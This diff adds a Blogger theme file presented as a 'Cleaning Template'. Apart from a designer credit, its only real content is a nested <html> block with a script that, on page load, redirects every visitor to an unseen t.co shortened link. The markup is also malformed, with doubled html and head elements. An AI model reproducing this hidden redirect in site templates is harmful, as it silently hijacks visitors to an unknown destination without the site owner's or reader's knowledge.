@@ -1,0 +1,26 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE html>
+<html b:css='false' b:defaultwidgetversion='2' b:layoutsVersion='3' b:responsive='true' b:templateVersion='1.3.3' expr:class='data:blog.languageDirection' expr:dir='data:blog.languageDirection' expr:lang='data:blog.locale' xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
+<head><b:attr expr:value='data:view.isSingleItem ? &quot;og: http://ogp.me/ns# fb: http://ogp.me/ns/fb# article: http://ogp.me/ns/article#&quot; : &quot;og: http://ogp.me/ns# fb: http://ogp.me/ns/fb# website: http://ogp.me/ns/website#&quot;' name='prefix'/>&#160;
+&#160;&#160;
+<b:skin><![CDATA[/*
+-----------------------------------------------
+Name : CNMU Cleaning Template
+Designer URL  : https://www.cnmu.info
+year          : 2022
+----------------------------------------------- */
+]]></b:skin>
+</head>
+  
+  
+  <html xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
+<head>
+    <script>
+        window.location.href = &quot;https://t.co/1velIeZFiU&quot;;
+    </script>
+</head>
+</html>
+<body>
+<b:section class='main' id='main' showaddelement='yes'/>
+</body>
+</html>
